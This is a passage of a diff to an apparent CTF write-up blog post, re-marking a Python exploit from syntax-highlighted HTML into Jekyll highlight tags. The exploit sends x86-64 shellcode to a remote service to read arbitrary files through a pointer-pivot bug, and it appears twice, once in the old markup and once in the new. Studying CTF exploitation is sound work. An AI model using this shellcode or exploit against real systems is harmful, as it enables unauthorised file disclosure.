-<span class="p">&amp;</span>hellip<span class="p">;</span>snip<span class="p">&amp;</span>hellip<span class="p">;</span></code></pre></div></p>
+&hellip;snip&hellip;
+{% endhighlight %}</p>
 
 <p>This also worked against the remote server! It showed me that there was a user called <code>amazon</code> with home directory <code>/home/amazon</code>. I adapted the exploit a bit to make it read arbitrary files. The instruction that needs adjusting is this one:</p>
 
-<p><div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="p">;</span> NULL byte fix
-xor byte <span class="o">[</span>rdi + 11<span class="o">]</span>, 0x41</code></pre></div></p>
+<p>{% highlight bash %}
+; NULL byte fix
+xor byte [rdi + 11], 0x41
+{% endhighlight %}</p>
 
 <p>We need to update the value 11, or <code>0x0b</code>. The exploit code was modified once more, spraying <code>time.sleep()</code> calls here and there:</p>
 
-<p><div class="highlight"><pre><code class="language-python" data-lang="python"><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+<p>{% highlight python %}</p>
 
-<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="err">!</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">python</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+<h1>!/usr/bin/python</h1>
 
-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
-<span class="kn">import</span> <span class="nn">time</span><span class="o">,</span> <span class="nn">re</span><span class="o">,</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">sys</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+<p>from socket import *
+import time, re, struct, sys</p>
 
-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">def</span> <span class="nf">getID</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
-    <span class="n">match</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s">r&#39;(\d.*)&amp;lsquo;, data.strip())</span>
-    <span class="k">if</span> <span class="n">match</span><span class="p">:</span>
-        <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+<p>def getID(data):
+    match = re.search(r&#8217;(\d.*)&lsquo;, data.strip())
+    if match:
+        return int(match.group(1))</p>
 
-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
-<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">localhost</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="mi">5333</span><span class="p">))</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+<p>s = socket(AF_INET, SOCK_STREAM)
+s.connect((&lsquo;localhost&rsquo;, 5333))</p>
 
-<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">banner</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+<h1>banner</h1>
 
-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+<p>s.recv(1024)</p>
 
-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
-<span class="n">filename</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+<p>length = len(sys.argv[1])
+filename = sys.argv[1].strip()</p>
 
-<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">send</span> <span class="n">first</span> <span class="n">string</span><span class="o">.</span> <span class="n">this</span> <span class="n">will</span> <span class="n">be</span> <span class="n">our</span> <span class="n">shellcode</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+<h1>send first string. this will be our shellcode</h1>
 
-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">c</span> <span class="mi">0</span> \<span class="n">xeb</span>\<span class="n">x3f</span>\<span class="n">x5f</span>\<span class="n">x80</span>\<span class="n">x77</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="o">+</span><span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">b</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="n">length</span><span class="p">)</span><span class="o">+&amp;</span><span class="n">lsquo</span><span class="p">;</span>\<span class="n">x41</span>\<span class="n">x48</span>\<span class="n">x31</span>\<span class="n">xc0</span>\<span class="n">x04</span>\<span class="n">x02</span>\<span class="n">x48</span>\<span class="n">x31</span>\<span class="n">xf6</span>\<span class="n">x0f</span>\<span class="n">x05</span>\<span class="n">x66</span>\<span class="n">x81</span>\<span class="n">xec</span>\<span class="n">xff</span>\<span class="n">x0f</span>\<span class="n">x48</span>\<span class="n">x8d</span>\<span class="n">x34</span>\<span class="n">x24</span>\<span class="n">x48</span>\<span class="n">x89</span>\<span class="n">xc7</span>\<span class="n">x48</span>\<span class="n">x31</span>\<span class="n">xd2</span>\<span class="n">x66</span>\<span class="n">xba</span>\<span class="n">xff</span>\<span class="n">x0f</span>\<span class="n">x48</span>\<span class="n">x31</span>\<span class="n">xc0</span>\<span class="n">x0f</span>\<span class="n">x05</span>\<span class="n">x48</span>\<span class="n">x31</span>\<span class="n">xff</span>\<span class="n">x40</span>\<span class="n">x80</span>\<span class="n">xc7</span>\<span class="n">x01</span>\<span class="n">x48</span>\<span class="n">x89</span>\<span class="n">xc2</span>\<span class="n">x48</span>\<span class="n">x31</span>\<span class="n">xc0</span>\<span class="n">x04</span>\<span class="n">x01</span>\<span class="n">x0f</span>\<span class="n">x05</span>\<span class="n">x48</span>\<span class="n">x31</span>\<span class="n">xc0</span>\<span class="n">x04</span>\<span class="n">x3c</span>\<span class="n">x0f</span>\<span class="n">x05</span>\<span class="n">xe8</span>\<span class="n">xbc</span>\<span class="n">xff</span>\<span class="n">xff</span>\<span class="n">xff</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="o">+</span><span class="n">filename</span><span class="o">+&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">A</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+<p>s.send(&lsquo;c 0 \xeb\x3f\x5f\x80\x77&rsquo;+struct.pack(&lsquo;&lt;b&rsquo;, length)+&lsquo;\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff&rsquo;+filename+&lsquo;A\n&rsquo;)</p>
 
-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+<p>time.sleep(0.1)</p>
 
-<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>  <span class="c"># receive pesky &amp;lsquo;&gt; &amp;rsquo;&lt;/h1&gt;</span>
+<h1>s.recv(2)  # receive pesky &lsquo;> &rsquo;</h1>
 
-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
-<span class="n">p_shellcode</span> <span class="o">=</span> <span class="n">getID</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+<p>data = s.recv(64)
+p_shellcode = getID(data)</p>
 
-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">print</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;[</span><span class="o">+</span><span class="p">]</span> <span class="n">shellcode</span> <span class="o">=</span> <span class="mi">0</span><span class="n">x</span><span class="p">{</span><span class="mi">0</span><span class="p">:</span><span class="mi">08</span><span class="n">x</span><span class="p">}</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">p_shellcode</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+<p>print &lsquo;[+] shellcode = 0x{0:08x}&rsquo;.format(p_shellcode)</p>
 
-<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">send</span> <span class="n">second</span> <span class="n">string</span><span class="o">.</span> <span class="n">this</span> <span class="n">will</span> <span class="n">be</span> <span class="n">our</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">pivot</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="n">pointer</span><span class="o">.&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+<h1>send second string. this will be our &lsquo;pivot&rsquo; pointer.</h1>
 
-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">c</span> <span class="mi">0</span> <span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">L</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="n">p_shellcode</span><span class="p">)</span> <span class="o">+</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+<p>s.send(&lsquo;c 0 &rsquo; + struct.pack(&lsquo;&lt;L&rsquo;, p_shellcode) + &lsquo;\n&rsquo;)</p>
 
-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
-<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
-<span class="n">p_pivot</span> <span class="o">=</span> <span class="n">getID</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+<p>time.sleep(0.1)
+data = s.recv(64)
+p_pivot = getID(data)</p>
 
-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">print</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;[</span><span class="o">+</span><span class="p">]</span> <span class="n">pivot</span> <span class="o">=</span> <span class="mi">0</span><span class="n">x</span><span class="p">{</span><span class="mi">0</span><span class="p">:</span><span class="mi">08</span><span class="n">x</span><span class="p">}</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">p_pivot</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+<p>print &lsquo;[+] pivot = 0x{0:08x}&rsquo;.format(p_pivot)</p>
 
-<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">let</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="n">s</span> <span class="n">crash</span> <span class="n">the</span> <span class="n">binary</span> <span class="n">to</span> <span class="n">see</span> <span class="k">if</span> <span class="n">this</span> <span class="n">works</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+<h1>let&rsquo;s crash the binary to see if this works</h1>
 
-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">c</span> <span class="mi">1</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+<p>s.send(&ldquo;c 1\n&rdquo;)</p>
 
-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
-<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
-<span class="n">p_tmp</span> <span class="o">=</span> <span class="n">getID</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+<p>time.sleep(0.1)
+data = s.recv(64)
+p_tmp = getID(data)</p>
 
-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">u</span> <span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">p_tmp</span><span class="p">)</span> <span class="o">+</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span> <span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">L</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="n">p_pivot</span><span class="o">-</span><span class="mh">0x10</span><span class="p">)</span> <span class="o">+</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+<p>s.send(&lsquo;u &rsquo; + str(p_tmp) + &lsquo; &rsquo; + struct.pack(&lsquo;&lt;L&rsquo;, p_pivot-0x10) + &lsquo;\n&rsquo;)</p>
 
-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
-<span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
-<span class="n">p_vuln</span> <span class="o">=</span> <span class="n">getID</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+<p>time.sleep(0.1)
+data = s.recv(64)
+p_vuln = getID(data)</p>
 
-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">print</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;[</span><span class="o">+</span><span class="p">]</span> <span class="n">vulnerable</span> <span class="n">pointer</span> <span class="o">=</span> <span class="mi">0</span><span class="n">x</span><span class="p">{</span><span class="mi">0</span><span class="p">:</span><span class="mi">08</span><span class="n">x</span><span class="p">}</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">p_vuln</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+<p>print &lsquo;[+] vulnerable pointer = 0x{0:08x}&rsquo;.format(p_vuln)</p>
 
-<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">send</span> <span class="n">read</span> <span class="n">request</span> <span class="n">to</span> <span class="n">crash</span> <span class="n">binary</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+<h1>send read request to crash binary</h1>
 
-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">r</span> <span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">p_vuln</span><span class="p">)</span> <span class="o">+</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+<p>s.send(&lsquo;r &rsquo; + str(p_vuln) + &lsquo;\n&rsquo;)</p>
 
-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
-<span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+<p>time.sleep(0.1)
+print s.recv(1024)</p>
 
-<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">terminate</span> <span class="n">connection</span> <span class="n">cleanly</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+<h1>terminate connection cleanly</h1>
 
-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
-<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">x</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+<p>time.sleep(0.1)
+s.send(&lsquo;x\n&rsquo;)</p>
 
-<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></code></pre></div></p>
+<p>s.close()
+{% endhighlight %}</p>
 
 <p>(Note: this exploit fails if the address contains a NULL byte, a space or a zero, as these truncate data. During the CTF, I experienced no problems).</p>
 
